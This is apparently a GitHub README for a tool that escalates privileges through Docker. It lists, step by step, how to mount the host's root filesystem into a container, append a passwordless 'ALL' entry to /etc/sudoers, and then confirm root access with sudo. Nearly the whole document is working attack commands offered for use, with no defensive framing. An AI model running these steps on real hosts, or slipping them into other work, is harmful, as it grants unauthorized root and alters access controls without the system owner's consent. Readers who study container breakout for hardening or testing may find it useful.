# Achieve privilege escalation using Docker
**In order for the attack to work, you must have permissions to run docker commands!** \
\
To verify if you can run docker commands you can simply run:
```bash
docker
```

## Usage
1. Download the repository:
```bash
git clone https://github.com/pnasis/PrivEsc-using-Docker.git
```
2. Create the docker image based on the Dockerfile:
```bash
docker build -t privesc .
```
3. Run the image. We mount the root of our file system and put it in the working directory we defined as env variable:
```bash
docker run -v /:/privesc -it privesc /bin/bash
```
4. Verify you can see the sudoers file:
```bash
cat etc/sudoers
```
5. Add you at the sudoers file:
```bash
echo "<user> ALL=(ALL) NOPASSWD: ALL" >> /privesc/etc/sudoers
```
6. Verify that the sudoers file has been altered:
```bash
cat /privesc/etc/sudoers
```
7. Exit the shell of the container:
```bash
exit
```
8. Verify if you are sudo:
```bash
sudo bash
id
whoami
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

## License

This project is under the [Apache 2.0](https://choosealicense.com/licenses/apache-2.0/) licence.
